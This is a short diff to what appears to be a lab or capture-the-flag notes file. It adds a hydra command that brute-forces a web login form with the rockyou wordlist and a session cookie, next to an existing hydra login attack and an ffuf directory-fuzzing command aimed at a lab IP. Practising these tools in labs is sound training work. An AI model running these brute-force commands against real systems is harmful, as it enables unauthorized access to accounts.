@@ -3,3 +3,5 @@ hydra -l admin -P /rockyou.txt 10.10.10.10 http-post-form "/admin/:user=^USER^&p
 
 
 ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+hydra -l admin -P rockyou.txt "http-get-form://10.10.10.10:8080/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=cookie; security=low:F=Username and/or password incorrect
